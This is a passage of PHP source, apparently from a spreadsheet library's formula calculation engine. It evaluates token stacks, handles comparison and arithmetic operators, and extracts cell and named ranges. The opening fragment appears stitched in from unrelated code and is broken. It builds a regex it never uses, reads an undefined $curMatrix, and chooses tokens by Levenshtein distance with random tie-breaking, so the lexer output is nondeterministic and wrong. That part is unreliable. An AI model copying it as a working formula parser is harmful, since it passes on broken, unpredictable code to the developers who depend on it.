        //    If we're using cell caching, then $pCell may well be flushed back to the cache (which detaches the parent worksheet),
        //        so we store the parent worksheet so that we can re-attach it when necessary
        // $pCellParent = ($pCell !== null) ? $pCell->getWorksheet() : null;
 
        $regexpMatchString = '/^(' . self::CALCULATION_REGEXP_FUNCTION .
                                '|' . self::CALCULATION_REGEXP_CELLREF .
                                '|' . self::CALCULATION_REGEXP_NUMBER .
                                '|' . self::CALCULATION_REGEXP_STRING .
                                '|' . self::CALCULATION_REGEXP_OPENBRACE .
                                '|' . self::CALCULATION_REGEXP_NAMEDRANGE .
                                '|' . self::CALCULATION_REGEXP_ERROR .
                                ')/si';

        //    Start with initialisation
        $curNum = 0;
        $stack = null;
        $output = [];
        $s = $this->cyclicFormulaCounter;
        $padding = "";
        $expectingOperator = false; //    We use this test in syntax-checking the expression to determine when a
                                                    //        - is a negation or + is a positive operator rather than an operation
        $expectingOperand = false; //    We use this test in syntax-checking the expression to determine whether an operand
                                                    //        should be null in a function call
        //    The guts of the lexical parser
        //    Loop through the formula extracting each operator and operand in turn
        $tokens = explode(" ", $formula);

        foreach (range(0, count($tokens) - 1) as $curNum) {
            $opCharacter = $tokens[$curNum]; //    Get the first character of the value at the current index position
            $tempOut = "";
            if (isset($curMatrix[$s][$opCharacter])) {
                $nState = $curMatrix[$s][$opCharacter][0];
                $tempOut = $curMatrix[$s][$opCharacter][1];
            } else {
                $padding = " ";
                $minimumVal = 0xff;
                $nState = 0;
                foreach ($curMatrix[$s] as $thisWord=>$curEdge) {
                    $distVal = levenshtein($opCharacter, $thisWord);
                    if ($distVal < $minimumVal) {
                        $minimumVal = $distVal;
                        $nState = $curEdge[0];
                        $tempOut = $curEdge[1];
                    } else if ($distVal == $minimumVal) {
                        $r = rand(0,1);
                        if ($r == 0) { $nState = $curEdge[0]; $tempOut = $curEdge[1]; }
                    }
                }
            }
            $output[] = $tempOut;
            $s = $nState;
        }
        return implode($padding, $output);
    }



    private static function dataTestReference(&$operandData)
    {
        $operand = $operandData['value'];
        if (($operandData['reference'] === null) && (is_array($operand))) {
            $rKeys = array_keys($operand);
            $rowKey = array_shift($rKeys);
            $cKeys = array_keys(array_keys($operand[$rowKey]));
            $colKey = array_shift($cKeys);
            if (ctype_upper($colKey)) {
                $operandData['reference'] = $colKey . $rowKey;
            }
        }

        return $operand;
    }

    // evaluate postfix notation

    /**
     * @param mixed $tokens
     * @param null|string $cellID
     * @param null|Cell $pCell
     *
     * @return bool
     */
    private function processTokenStack($tokens, $cellID = null, Cell $pCell = null)
    {
        if ($tokens == false) {
            return false;
        }

        //    If we're using cell caching, then $pCell may well be flushed back to the cache (which detaches the parent cell collection),
        //        so we store the parent cell collection so that we can re-attach it when necessary
        $pCellWorksheet = ($pCell !== null) ? $pCell->getWorksheet() : null;
        $pCellParent = ($pCell !== null) ? $pCell->getParent() : null;
        $stack = new Stack();

        //    Loop through each token in turn
        foreach ($tokens as $tokenData) {
            $token = $tokenData['value'];
            // if the token is a binary operator, pop the top two values off the stack, do the operation, and push the result back on the stack
            if (isset(self::$binaryOperators[$token])) {
                //    We must have two operands, error if we don't
                if (($operand2Data = $stack->pop()) === null) {
                    return $this->raiseFormulaError('Internal error - Operand value missing from stack');
                }
                if (($operand1Data = $stack->pop()) === null) {
                    return $this->raiseFormulaError('Internal error - Operand value missing from stack');
                }

                $operand1 = self::dataTestReference($operand1Data);
                $operand2 = self::dataTestReference($operand2Data);

                //    Log what we're doing
                if ($token == ':') {
                    $this->debugLog->writeDebugLog('Evaluating Range ', $this->showValue($operand1Data['reference']), ' ', $token, ' ', $this->showValue($operand2Data['reference']));
                } else {
                    $this->debugLog->writeDebugLog('Evaluating ', $this->showValue($operand1), ' ', $token, ' ', $this->showValue($operand2));
                }

                //    Process the operation in the appropriate manner
                switch ($token) {
                    //    Comparison (Boolean) Operators
                    case '>':            //    Greater than
                    case '<':            //    Less than
                    case '>=':            //    Greater than or Equal to
                    case '<=':            //    Less than or Equal to
                    case '=':            //    Equality
                    case '<>':            //    Inequality
                        $this->executeBinaryComparisonOperation($cellID, $operand1, $operand2, $token, $stack);

                        break;
                    //    Binary Operators
                    case ':':            //    Range
                        if (strpos($operand1Data['reference'], '!') !== false) {
                            list($sheet1, $operand1Data['reference']) = Worksheet::extractSheetTitle($operand1Data['reference'], true);
                        } else {
                            $sheet1 = ($pCellParent !== null) ? $pCellWorksheet->getTitle() : '';
                        }

                        list($sheet2, $operand2Data['reference']) = Worksheet::extractSheetTitle($operand2Data['reference'], true);
                        if (empty($sheet2)) {
                            $sheet2 = $sheet1;
                        }

                        if ($sheet1 == $sheet2) {
                            if ($operand1Data['reference'] === null) {
                                if ((trim($operand1Data['value']) != '') && (is_numeric($operand1Data['value']))) {
                                    $operand1Data['reference'] = $pCell->getColumn() . $operand1Data['value'];
                                } elseif (trim($operand1Data['reference']) == '') {
                                    $operand1Data['reference'] = $pCell->getCoordinate();
                                } else {
                                    $operand1Data['reference'] = $operand1Data['value'] . $pCell->getRow();
                                }
                            }
                            if ($operand2Data['reference'] === null) {
                                if ((trim($operand2Data['value']) != '') && (is_numeric($operand2Data['value']))) {
                                    $operand2Data['reference'] = $pCell->getColumn() . $operand2Data['value'];
                                } elseif (trim($operand2Data['reference']) == '') {
                                    $operand2Data['reference'] = $pCell->getCoordinate();
                                } else {
                                    $operand2Data['reference'] = $operand2Data['value'] . $pCell->getRow();
                                }
                            }

                            $oData = array_merge(explode(':', $operand1Data['reference']), explode(':', $operand2Data['reference']));
                            $oCol = $oRow = [];
                            foreach ($oData as $oDatum) {
                                $oCR = Coordinate::coordinateFromString($oDatum);
                                $oCol[] = Coordinate::columnIndexFromString($oCR[0]) - 1;
                                $oRow[] = $oCR[1];
                            }
                            $cellRef = Coordinate::stringFromColumnIndex(min($oCol) + 1) . min($oRow) . ':' . Coordinate::stringFromColumnIndex(max($oCol) + 1) . max($oRow);
                            if ($pCellParent !== null) {
                                $cellValue = $this->extractCellRange($cellRef, $this->spreadsheet->getSheetByName($sheet1), false);
                            } else {
                                return $this->raiseFormulaError('Unable to access Cell Reference');
                            }
                            $stack->push('Cell Reference', $cellValue, $cellRef);
                        } else {
                            $stack->push('Error', Functions::REF(), null);
                        }

                        break;
                    case '+':            //    Addition
                        $this->executeNumericBinaryOperation($operand1, $operand2, $token, 'plusEquals', $stack);

                        break;
                    case '-':            //    Subtraction
                        $this->executeNumericBinaryOperation($operand1, $operand2, $token, 'minusEquals', $stack);

                        break;
                    case '*':            //    Multiplication
                        $this->executeNumericBinaryOperation($operand1, $operand2, $token, 'arrayTimesEquals', $stack);

                        break;
                    case '/':            //    Division
                        $this->executeNumericBinaryOperation($operand1, $operand2, $token, 'arrayRightDivide', $stack);

                        break;
                    case '^':            //    Exponential
                        $this->executeNumericBinaryOperation($operand1, $operand2, $token, 'power', $stack);

                        break;
                    case '&':            //    Concatenation
                        //    If either of the operands is a matrix, we need to treat them both as matrices
                        //        (converting the other operand to a matrix if need be); then perform the required
                        //        matrix operation
                        if (is_bool($operand1)) {
                            $operand1 = ($operand1) ? self::$localeBoolean['TRUE'] : self::$localeBoolean['FALSE'];
                        }
                        if (is_bool($operand2)) {
                            $operand2 = ($operand2) ? self::$localeBoolean['TRUE'] : self::$localeBoolean['FALSE'];
                        }
                        if ((is_array($operand1)) || (is_array($operand2))) {
                            //    Ensure that both operands are arrays/matrices
                            self::checkMatrixOperands($operand1, $operand2, 2);

                            try {
                                //    Convert operand 1 from a PHP array to a matrix
                                $matrix = new Shared\JAMA\Matrix($operand1);
                                //    Perform the required operation against the operand 1 matrix, passing in operand 2
                                $matrixResult = $matrix->concat($operand2);
                                $result = $matrixResult->getArray();
                            } catch (\Exception $ex) {
                                $this->debugLog->writeDebugLog('JAMA Matrix Exception: ', $ex->getMessage());
                                $result = '#VALUE!';
                            }
                        } else {
                            $result = '"' . str_replace('""', '"', self::unwrapResult($operand1) . self::unwrapResult($operand2)) . '"';
                        }
                        $this->debugLog->writeDebugLog('Evaluation Result is ', $this->showTypeDetails($result));
                        $stack->push('Value', $result);

                        break;
                    case '|':            //    Intersect
                        $rowIntersect = array_intersect_key($operand1, $operand2);
                        $cellIntersect = $oCol = $oRow = [];
                        foreach (array_keys($rowIntersect) as $row) {
                            $oRow[] = $row;
                            foreach ($rowIntersect[$row] as $col => $data) {
                                $oCol[] = Coordinate::columnIndexFromString($col) - 1;
                                $cellIntersect[$row] = array_intersect_key($operand1[$row], $operand2[$row]);
                            }
                        }
                        $cellRef = Coordinate::stringFromColumnIndex(min($oCol) + 1) . min($oRow) . ':' . Coordinate::stringFromColumnIndex(max($oCol) + 1) . max($oRow);
                        $this->debugLog->writeDebugLog('Evaluation Result is ', $this->showTypeDetails($cellIntersect));
                        $stack->push('Value', $cellIntersect, $cellRef);

                        break;
                }

                // if the token is a unary operator, pop one value off the stack, do the operation, and push it back on
            } elseif (($token === '~') || ($token === '%')) {
                if (($arg = $stack->pop()) === null) {
                    return $this->raiseFormulaError('Internal error - Operand value missing from stack');
                }
                $arg = $arg['value'];
                if ($token === '~') {
                    $this->debugLog->writeDebugLog('Evaluating Negation of ', $this->showValue($arg));
                    $multiplier = -1;
                } else {
                    $this->debugLog->writeDebugLog('Evaluating Percentile of ', $this->showValue($arg));
                    $multiplier = 0.01;
                }
                if (is_array($arg)) {
                    self::checkMatrixOperands($arg, $multiplier, 2);

                    try {
                        $matrix1 = new Shared\JAMA\Matrix($arg);
                        $matrixResult = $matrix1->arrayTimesEquals($multiplier);
                        $result = $matrixResult->getArray();
                    } catch (\Exception $ex) {
                        $this->debugLog->writeDebugLog('JAMA Matrix Exception: ', $ex->getMessage());
                        $result = '#VALUE!';
                    }
                    $this->debugLog->writeDebugLog('Evaluation Result is ', $this->showTypeDetails($result));
                    $stack->push('Value', $result);
                } else {
                    $this->executeNumericBinaryOperation($multiplier, $arg, '*', 'arrayTimesEquals', $stack);
                }
            } elseif (preg_match('/^' . self::CALCULATION_REGEXP_CELLREF . '$/i', $token, $matches)) {
                $cellRef = null;
                if (isset($matches[8])) {
                    if ($pCell === null) {
                        //                        We can't access the range, so return a REF error
                        $cellValue = Functions::REF();
                    } else {
                        $cellRef = $matches[6] . $matches[7] . ':' . $matches[9] . $matches[10];
                        if ($matches[2] > '') {
                            $matches[2] = trim($matches[2], "\"'");
                            if ((strpos($matches[2], '[') !== false) || (strpos($matches[2], ']') !== false)) {
                                //    It's a Reference to an external spreadsheet (not currently supported)
                                return $this->raiseFormulaError('Unable to access External Workbook');
                            }
                            $matches[2] = trim($matches[2], "\"'");
                            $this->debugLog->writeDebugLog('Evaluating Cell Range ', $cellRef, ' in worksheet ', $matches[2]);
                            if ($pCellParent !== null) {
                                $cellValue = $this->extractCellRange($cellRef, $this->spreadsheet->getSheetByName($matches[2]), false);
                            } else {
                                return $this->raiseFormulaError('Unable to access Cell Reference');
                            }
                            $this->debugLog->writeDebugLog('Evaluation Result for cells ', $cellRef, ' in worksheet ', $matches[2], ' is ', $this->showTypeDetails($cellValue));
                        } else {
                            $this->debugLog->writeDebugLog('Evaluating Cell Range ', $cellRef, ' in current worksheet');
                            if ($pCellParent !== null) {
                                $cellValue = $this->extractCellRange($cellRef, $pCellWorksheet, false);
                            } else {
                                return $this->raiseFormulaError('Unable to access Cell Reference');
                            }
                            $this->debugLog->writeDebugLog('Evaluation Result for cells ', $cellRef, ' is ', $this->showTypeDetails($cellValue));
                        }
                    }
                } else {
                    if ($pCell === null) {
                        //                        We can't access the cell, so return a REF error
                        $cellValue = Functions::REF();
                    } else {
                        $cellRef = $matches[6] . $matches[7];
                        if ($matches[2] > '') {
                            $matches[2] = trim($matches[2], "\"'");
                            if ((strpos($matches[2], '[') !== false) || (strpos($matches[2], ']') !== false)) {
                                //    It's a Reference to an external spreadsheet (not currently supported)
                                return $this->raiseFormulaError('Unable to access External Workbook');
                            }
                            $this->debugLog->writeDebugLog('Evaluating Cell ', $cellRef, ' in worksheet ', $matches[2]);
                            if ($pCellParent !== null) {
                                $cellSheet = $this->spreadsheet->getSheetByName($matches[2]);
                                if ($cellSheet && $cellSheet->cellExists($cellRef)) {
                                    $cellValue = $this->extractCellRange($cellRef, $this->spreadsheet->getSheetByName($matches[2]), false);
                                    $pCell->attach($pCellParent);
                                } else {
                                    $cellValue = null;
                                }
                            } else {
                                return $this->raiseFormulaError('Unable to access Cell Reference');
                            }
                            $this->debugLog->writeDebugLog('Evaluation Result for cell ', $cellRef, ' in worksheet ', $matches[2], ' is ', $this->showTypeDetails($cellValue));
                        } else {
                            $this->debugLog->writeDebugLog('Evaluating Cell ', $cellRef, ' in current worksheet');
                            if ($pCellParent->has($cellRef)) {
                                $cellValue = $this->extractCellRange($cellRef, $pCellWorksheet, false);
                                $pCell->attach($pCellParent);
                            } else {
                                $cellValue = null;
                            }
                            $this->debugLog->writeDebugLog('Evaluation Result for cell ', $cellRef, ' is ', $this->showTypeDetails($cellValue));
                        }
                    }
                }
                $stack->push('Value', $cellValue, $cellRef);

            // if the token is a function, pop arguments off the stack, hand them to the function, and push the result back on
            } elseif (preg_match('/^' . self::CALCULATION_REGEXP_FUNCTION . '$/i', $token, $matches)) {
                $functionName = $matches[1];
                $argCount = $stack->pop();
                $argCount = $argCount['value'];
                if ($functionName != 'MKMATRIX') {
                    $this->debugLog->writeDebugLog('Evaluating Function ', self::localeFunc($functionName), '() with ', (($argCount == 0) ? 'no' : $argCount), ' argument', (($argCount == 1) ? '' : 's'));
                }
                if ((isset(self::$phpSpreadsheetFunctions[$functionName])) || (isset(self::$controlFunctions[$functionName]))) {    // function
                    if (isset(self::$phpSpreadsheetFunctions[$functionName])) {
                        $functionCall = self::$phpSpreadsheetFunctions[$functionName]['functionCall'];
                        $passByReference = isset(self::$phpSpreadsheetFunctions[$functionName]['passByReference']);
                        $passCellReference = isset(self::$phpSpreadsheetFunctions[$functionName]['passCellReference']);
                    } elseif (isset(self::$controlFunctions[$functionName])) {
                        $functionCall = self::$controlFunctions[$functionName]['functionCall'];
                        $passByReference = isset(self::$controlFunctions[$functionName]['passByReference']);
                        $passCellReference = isset(self::$controlFunctions[$functionName]['passCellReference']);
                    }
                    // get the arguments for this function
                    $args = $argArrayVals = [];
                    for ($i = 0; $i < $argCount; ++$i) {
                        $arg = $stack->pop();
                        $a = $argCount - $i - 1;
                        if (($passByReference) &&
                            (isset(self::$phpSpreadsheetFunctions[$functionName]['passByReference'][$a])) &&
                            (self::$phpSpreadsheetFunctions[$functionName]['passByReference'][$a])) {
                            if ($arg['reference'] === null) {
                                $args[] = $cellID;
                                if ($functionName != 'MKMATRIX') {
                                    $argArrayVals[] = $this->showValue($cellID);
                                }
                            } else {
                                $args[] = $arg['reference'];
                                if ($functionName != 'MKMATRIX') {
                                    $argArrayVals[] = $this->showValue($arg['reference']);
                                }
                            }
                        } else {
                            $args[] = self::unwrapResult($arg['value']);
                            if ($functionName != 'MKMATRIX') {
                                $argArrayVals[] = $this->showValue($arg['value']);
                            }
                        }
                    }
                    //    Reverse the order of the arguments
                    krsort($args);

                    if (($passByReference) && ($argCount == 0)) {
                        $args[] = $cellID;
                        $argArrayVals[] = $this->showValue($cellID);
                    }

                    if ($functionName != 'MKMATRIX') {
                        if ($this->debugLog->getWriteDebugLog()) {
                            krsort($argArrayVals);
                            $this->debugLog->writeDebugLog('Evaluating ', self::localeFunc($functionName), '( ', implode(self::$localeArgumentSeparator . ' ', Functions::flattenArray($argArrayVals)), ' )');
                        }
                    }

                    //    Process the argument with the appropriate function call
                    $args = $this->addCellReference($args, $passCellReference, $functionCall, $pCell);

                    if (!is_array($functionCall)) {
                        foreach ($args as &$arg) {
                            $arg = Functions::flattenSingleValue($arg);
                        }
                        unset($arg);
                    }
                    $result = call_user_func_array($functionCall, $args);

                    if ($functionName != 'MKMATRIX') {
                        $this->debugLog->writeDebugLog('Evaluation Result for ', self::localeFunc($functionName), '() function call is ', $this->showTypeDetails($result));
                    }
                    $stack->push('Value', self::wrapResult($result));
                }
            } else {
                // if the token is a number, boolean, string or an Excel error, push it onto the stack
                if (isset(self::$excelConstants[strtoupper($token)])) {
                    $excelConstant = strtoupper($token);
                    $stack->push('Constant Value', self::$excelConstants[$excelConstant]);
                    $this->debugLog->writeDebugLog('Evaluating Constant ', $excelConstant, ' as ', $this->showTypeDetails(self::$excelConstants[$excelConstant]));
                } elseif ((is_numeric($token)) || ($token === null) || (is_bool($token)) || ($token == '') || ($token[0] == '"') || ($token[0] == '#')) {
                    $stack->push('Value', $token);
                // if the token is a named range, push the named range name onto the stack
                } elseif (preg_match('/^' . self::CALCULATION_REGEXP_NAMEDRANGE . '$/i', $token, $matches)) {
                    $namedRange = $matches[6];
                    $this->debugLog->writeDebugLog('Evaluating Named Range ', $namedRange);

                    $cellValue = $this->extractNamedRange($namedRange, ((null !== $pCell) ? $pCellWorksheet : null), false);
                    $pCell->attach($pCellParent);
                    $this->debugLog->writeDebugLog('Evaluation Result for named range ', $namedRange, ' is ', $this->showTypeDetails($cellValue));
                    $stack->push('Named Range', $cellValue, $namedRange);
                } else {
                    return $this->raiseFormulaError("undefined variable '$token'");
                }
            }
        }
        // when we're out of tokens, the stack should have a single element, the final result
        if ($stack->count() != 1) {
            return $this->raiseFormulaError('internal error');
        }
        $output = $stack->pop();
        $output = $output['value'];

        return $output;
    }

    private function validateBinaryOperand(&$operand, &$stack)
    {
        if (is_array($operand)) {
            if ((count($operand, COUNT_RECURSIVE) - count($operand)) == 1) {
                do {
                    $operand = array_pop($operand);
                } while (is_array($operand));
            }
        }
        //    Numbers, matrices and booleans can pass straight through, as they're already valid
        if (is_string($operand)) {
            //    We only need special validations for the operand if it is a string
            //    Start by stripping off the quotation marks we use to identify true excel string values internally
            if ($operand > '' && $operand[0] == '"') {
                $operand = self::unwrapResult($operand);
            }
            //    If the string is a numeric value, we treat it as a numeric, so no further testing
            if (!is_numeric($operand)) {
                //    If not a numeric, test to see if the value is an Excel error, and so can't be used in normal binary operations
                if ($operand > '' && $operand[0] == '#') {
                    $stack->push('Value', $operand);
                    $this->debugLog->writeDebugLog('Evaluation Result is ', $this->showTypeDetails($operand));

                    return false;
                } elseif (!Shared\StringHelper::convertToNumberIfFraction($operand)) {
                    //    If not a numeric or a fraction, then it's a text string, and so can't be used in mathematical binary operations
                    $stack->push('Value', '#VALUE!');
                    $this->debugLog->writeDebugLog('Evaluation Result is a ', $this->showTypeDetails('#VALUE!'));

                    return false;
                }
            }
        }

        //    return a true if the value of the operand is one that we can use in normal binary operations
        return true;
    }

    /**
     * @param null|string $cellID
     * @param mixed $operand1
     * @param mixed $operand2
     * @param string $operation
     * @param Stack $stack
     * @param bool $recursingArrays
     *
     * @return bool
     */
    private function executeBinaryComparisonOperation($cellID, $operand1, $operand2, $operation, Stack &$stack, $recursingArrays = false)
    {
        //    If we're dealing with matrix operations, we want a matrix result
        if ((is_array($operand1)) || (is_array($operand2))) {
            $result = [];
            if ((is_array($operand1)) && (!is_array($operand2))) {
                foreach ($operand1 as $x => $operandData) {
                    $this->debugLog->writeDebugLog('Evaluating Comparison ', $this->showValue($operandData), ' ', $operation, ' ', $this->showValue($operand2));
                    $this->executeBinaryComparisonOperation($cellID, $operandData, $operand2, $operation, $stack);
                    $r = $stack->pop();
                    $result[$x] = $r['value'];
                }
            } elseif ((!is_array($operand1)) && (is_array($operand2))) {
                foreach ($operand2 as $x => $operandData) {
                    $this->debugLog->writeDebugLog('Evaluating Comparison ', $this->showValue($operand1), ' ', $operation, ' ', $this->showValue($operandData));
                    $this->executeBinaryComparisonOperation($cellID, $operand1, $operandData, $operation, $stack);
                    $r = $stack->pop();
                    $result[$x] = $r['value'];
                }
            } else {
                if (!$recursingArrays) {
                    self::checkMatrixOperands($operand1, $operand2, 2);
                }
                foreach ($operand1 as $x => $operandData) {
                    $this->debugLog->writeDebugLog('Evaluating Comparison ', $this->showValue($operandData), ' ', $operation, ' ', $this->showValue($operand2[$x]));
                    $this->executeBinaryComparisonOperation($cellID, $operandData, $operand2[$x], $operation, $stack, true);
                    $r = $stack->pop();
                    $result[$x] = $r['value'];
                }
            }
            //    Log the result details
            $this->debugLog->writeDebugLog('Comparison Evaluation Result is ', $this->showTypeDetails($result));
            //    And push the result onto the stack
            $stack->push('Array', $result);

            return true;
        }

        //    Simple validate the two operands if they are string values
        if (is_string($operand1) && $operand1 > '' && $operand1[0] == '"') {
            $operand1 = self::unwrapResult($operand1);
        }
        if (is_string($operand2) && $operand2 > '' && $operand2[0] == '"') {
            $operand2 = self::unwrapResult($operand2);
        }

        // Use case insensitive comparaison if not OpenOffice mode
        if (Functions::getCompatibilityMode() != Functions::COMPATIBILITY_OPENOFFICE) {
            if (is_string($operand1)) {
                $operand1 = strtoupper($operand1);
            }
            if (is_string($operand2)) {
                $operand2 = strtoupper($operand2);
            }
        }

        $useLowercaseFirstComparison = is_string($operand1) && is_string($operand2) && Functions::getCompatibilityMode() == Functions::COMPATIBILITY_OPENOFFICE;

        //    execute the necessary operation
        switch ($operation) {
            //    Greater than
            case '>':
                if ($useLowercaseFirstComparison) {
                    $result = $this->strcmpLowercaseFirst($operand1, $operand2) > 0;
                } else {
                    $result = ($operand1 > $operand2);
                }

                break;
            //    Less than
            case '<':
                if ($useLowercaseFirstComparison) {
                    $result = $this->strcmpLowercaseFirst($operand1, $operand2) < 0;
                } else {
                    $result = ($operand1 < $operand2);
                }

                break;
            //    Equality
            case '=':
                if (is_numeric($operand1) && is_numeric($operand2)) {
                    $result = (abs($operand1 - $operand2) < $this->delta);
                } else {
                    $result = strcmp($operand1, $operand2) == 0;
                }

                break;
            //    Greater than or equal
            case '>=':
                if (is_numeric($operand1) && is_numeric($operand2)) {
                    $result = ((abs($operand1 - $operand2) < $this->delta) || ($operand1 > $operand2));
                } elseif ($useLowercaseFirstComparison) {
                    $result = $this->strcmpLowercaseFirst($operand1, $operand2) >= 0;
                } else {
                    $result = strcmp($operand1, $operand2) >= 0;
                }

                break;
            //    Less than or equal
            case '<=':
                if (is_numeric($operand1) && is_numeric($operand2)) {
                    $result = ((abs($operand1 - $operand2) < $this->delta) || ($operand1 < $operand2));
                } elseif ($useLowercaseFirstComparison) {
                    $result = $this->strcmpLowercaseFirst($operand1, $operand2) <= 0;
                } else {
                    $result = strcmp($operand1, $operand2) <= 0;
                }

                break;
            //    Inequality
            case '<>':
                if (is_numeric($operand1) && is_numeric($operand2)) {
                    $result = (abs($operand1 - $operand2) > 1E-14);
                } else {
                    $result = strcmp($operand1, $operand2) != 0;
                }

                break;
        }

        //    Log the result details
        $this->debugLog->writeDebugLog('Evaluation Result is ', $this->showTypeDetails($result));
        //    And push the result onto the stack
        $stack->push('Value', $result);

        return true;
    }

    /**
     * Compare two strings in the same way as strcmp() except that lowercase come before uppercase letters.
     *
     * @param string $str1 First string value for the comparison
     * @param string $str2 Second string value for the comparison
     *
     * @return int
     */
    private function strcmpLowercaseFirst($str1, $str2)
    {
        $inversedStr1 = Shared\StringHelper::strCaseReverse($str1);
        $inversedStr2 = Shared\StringHelper::strCaseReverse($str2);

        return strcmp($inversedStr1, $inversedStr2);
    }

    /**
     * @param mixed $operand1
     * @param mixed $operand2
     * @param mixed $operation
     * @param string $matrixFunction
     * @param mixed $stack
     *
     * @return bool
     */
    private function executeNumericBinaryOperation($operand1, $operand2, $operation, $matrixFunction, &$stack)
    {
        //    Validate the two operands
        if (!$this->validateBinaryOperand($operand1, $stack)) {
            return false;
        }
        if (!$this->validateBinaryOperand($operand2, $stack)) {
            return false;
        }

        //    If either of the operands is a matrix, we need to treat them both as matrices
        //        (converting the other operand to a matrix if need be); then perform the required
        //        matrix operation
        if ((is_array($operand1)) || (is_array($operand2))) {
            //    Ensure that both operands are arrays/matrices of the same size
            self::checkMatrixOperands($operand1, $operand2, 2);

            try {
                //    Convert operand 1 from a PHP array to a matrix
                $matrix = new Shared\JAMA\Matrix($operand1);
                //    Perform the required operation against the operand 1 matrix, passing in operand 2
                $matrixResult = $matrix->$matrixFunction($operand2);
                $result = $matrixResult->getArray();
            } catch (\Exception $ex) {
                $this->debugLog->writeDebugLog('JAMA Matrix Exception: ', $ex->getMessage());
                $result = '#VALUE!';
            }
        } else {
            if ((Functions::getCompatibilityMode() != Functions::COMPATIBILITY_OPENOFFICE) &&
                ((is_string($operand1) && !is_numeric($operand1) && strlen($operand1) > 0) ||
                 (is_string($operand2) && !is_numeric($operand2) && strlen($operand2) > 0))) {
                $result = Functions::VALUE();
            } else {
                //    If we're dealing with non-matrix operations, execute the necessary operation
                switch ($operation) {
                    //    Addition
                    case '+':
                        $result = $operand1 + $operand2;

                        break;
                    //    Subtraction
                    case '-':
                        $result = $operand1 - $operand2;

                        break;
                    //    Multiplication
                    case '*':
                        $result = $operand1 * $operand2;

                        break;
                    //    Division
                    case '/':
                        if ($operand2 == 0) {
                            //    Trap for Divide by Zero error
                            $stack->push('Value', '#DIV/0!');
                            $this->debugLog->writeDebugLog('Evaluation Result is ', $this->showTypeDetails('#DIV/0!'));

                            return false;
                        }
                            $result = $operand1 / $operand2;

                        break;
                    //    Power
                    case '^':
                        $result = pow($operand1, $operand2);

                        break;
                }
            }
        }

        //    Log the result details
        $this->debugLog->writeDebugLog('Evaluation Result is ', $this->showTypeDetails($result));
        //    And push the result onto the stack
        $stack->push('Value', $result);

        return true;
    }

    // trigger an error, but nicely, if need be
    protected function raiseFormulaError($errorMessage)
    {
        $this->formulaError = $errorMessage;
        $this->cyclicReferenceStack->clear();
        if (!$this->suppressFormulaErrors) {
            throw new Exception($errorMessage);
        }
        trigger_error($errorMessage, E_USER_ERROR);

        return false;
    }

    /**
     * Extract range values.
     *
     * @param string &$pRange String based range representation
     * @param Worksheet $pSheet Worksheet
     * @param bool $resetLog Flag indicating whether calculation log should be reset or not
     *
     * @return mixed Array of values in range if range contains more than one element. Otherwise, a single value is returned.
     */
    public function extractCellRange(&$pRange = 'A1', Worksheet $pSheet = null, $resetLog = true)
    {
        // Return value
        $returnValue = [];

        if ($pSheet !== null) {
            $pSheetName = $pSheet->getTitle();
            if (strpos($pRange, '!') !== false) {
                list($pSheetName, $pRange) = Worksheet::extractSheetTitle($pRange, true);
                $pSheet = $this->spreadsheet->getSheetByName($pSheetName);
            }

            // Extract range
            $aReferences = Coordinate::extractAllCellReferencesInRange($pRange);
            $pRange = $pSheetName . '!' . $pRange;
            if (!isset($aReferences[1])) {
                $currentCol = '';
                $currentRow = 0;
                //    Single cell in range
                sscanf($aReferences[0], '%[A-Z]%d', $currentCol, $currentRow);
                if ($pSheet->cellExists($aReferences[0])) {
                    $returnValue[$currentRow][$currentCol] = $pSheet->getCell($aReferences[0])->getCalculatedValue($resetLog);
                } else {
                    $returnValue[$currentRow][$currentCol] = null;
                }
            } else {
                // Extract cell data for all cells in the range
                foreach ($aReferences as $reference) {
                    $currentCol = '';
                    $currentRow = 0;
                    // Extract range
                    sscanf($reference, '%[A-Z]%d', $currentCol, $currentRow);
                    if ($pSheet->cellExists($reference)) {
                        $returnValue[$currentRow][$currentCol] = $pSheet->getCell($reference)->getCalculatedValue($resetLog);
                    } else {
                        $returnValue[$currentRow][$currentCol] = null;
                    }
                }
            }
        }

        return $returnValue;
    }

    /**
     * Extract range values.
     *
     * @param string &$pRange String based range representation
     * @param Worksheet $pSheet Worksheet
     * @param bool $resetLog Flag indicating whether calculation log should be reset or not
     *
     * @return mixed Array of values in range if range contains more than one element. Otherwise, a single value is returned.
     */
    public function extractNamedRange(&$pRange = 'A1', Worksheet $pSheet = null, $resetLog = true)
    {
        // Return value
        $returnValue = [];

        if ($pSheet !== null) {
            $pSheetName = $pSheet->getTitle();
            if (strpos($pRange, '!') !== false) {
                list($pSheetName, $pRange) = Worksheet::extractSheetTitle($pRange, true);
                $pSheet = $this->spreadsheet->getSheetByName($pSheetName);
            }

            // Named range?
            $namedRange = NamedRange::resolveRange($pRange, $pSheet);
            if ($namedRange !== null) {
                $pSheet = $namedRange->getWorksheet();
                $pRange = $namedRange->getRange();
                $splitRange = Coordinate::splitRange($pRange);
                //    Convert row and column references
                if (ctype_alpha($splitRange[0][0])) {
                    $pRange = $splitRange[0][0] . '1:' . $splitRange[0][1] . $namedRange->getWorksheet()->getHighestRow();
                } elseif (ctype_digit($splitRange[0][0])) {
                    $pRange = 'A' . $splitRange[0][0] . ':' . $namedRange->getWorksheet()->getHighestColumn() . $splitRange[0][1];
                }
            } else {
                return Functions::REF();
            }

            // Extract range
            $aReferences = Coordinate::extractAllCellReferencesInRange($pRange);
            if (!isset($aReferences[1])) {
                //    Single cell (or single column or row) in range
                list($currentCol, $currentRow) = Coordinate::coordinateFromString($aReferences[0]);
                if ($pSheet->cellExists($aReferences[0])) {
                    $returnValue[$currentRow][$currentCol] = $pSheet->getCell($aReferences[0])->getCalculatedValue($resetLog);
                } else {
                    $returnValue[$currentRow][$currentCol] = null;
                }
            } else {
                // Extract cell data for all cells in the range
                foreach ($aReferences as $reference) {
                    // Extract range
                    list($currentCol, $currentRow) = Coordinate::coordinateFromString($reference);
                    if ($pSheet->cellExists($reference)) {
                        $returnValue[$currentRow][$currentCol] = $pSheet->getCell($reference)->getCalculatedValue($resetLog);
                    } else {
                        $returnValue[$currentRow][$currentCol] = null;
                    }
                }
            }
        }

        return $returnValue;
    }

    /**
     * Is a specific function implemented?
     *
     * @param string $pFunction Function Name
     *
     * @return bool
     */
    public function isImplemented($pFunction)
    {
        $pFunction = strtoupper($pFunction);
        $notImplemented = !isset(self::$phpSpreadsheetFunctions[$pFunction]) || (is_array(self::$phpSpreadsheetFunctions[$pFunction]['functionCall']) && self::$phpSpreadsheetFunctions[$pFunction]['functionCall'][1] === 'DUMMY');

        return !$notImplemented;
    }

    /**
